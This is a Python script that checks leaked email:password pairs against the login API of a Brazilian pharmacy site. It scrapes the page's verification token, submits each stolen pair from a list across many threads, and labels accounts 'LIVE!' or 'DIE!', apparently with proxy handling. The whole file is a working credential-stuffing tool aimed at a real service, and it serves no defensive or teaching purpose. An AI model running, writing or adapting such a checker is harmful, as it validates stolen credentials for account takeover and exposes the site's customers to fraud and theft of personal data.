import requests, utils, concurrent.futures
from bs4 import BeautifulSoup

emaillist = "./accounts"
livelist = "./ultrafarma"

def check():
    try:
        account = utils.save.removeFirstLine(emaillist).strip()
        [email, senha] =  account.split(':')
        session = utils.session()
        r = session.get('https://www.ultrafarma.com.br/identificacao')
        soup = BeautifulSoup(r.text, "html.parser")
        token = soup.find('input', {'name': 'RequestVerificationToken'})['value']
        resp = session.post('https://www.ultrafarma.com.br/api/login', headers= {"RequestVerificationToken": token}, data = {"login": email,"senha": senha,"manterConectado": "false"})
        if '"sucesso":false' in resp.text:
            utils.colors.error('DIE!')
        elif '"sucesso":true' in resp.text:
            utils.colors.correct('LIVE!')
        elif 'HTTPSConnectionPool' in resp.text:
            utils.colors.info('PROXY!')
    except Exception as e:
        utils.colors.info(e)
        utils.save.savetofile(emaillist, account)

if __name__ == "__main__":
    try:
        lista_len = utils.get_len(emaillist)
        utils.colors.correct(f"Loaded {lista_len}x items.")
        with concurrent.futures.ThreadPoolExecutor(max_workers=int(input("Threads: "))) as executor:
            [executor.submit(check) for i in range(0, lista_len, 1)]
    except KeyboardInterrupt:
        pass

input('Acabou.')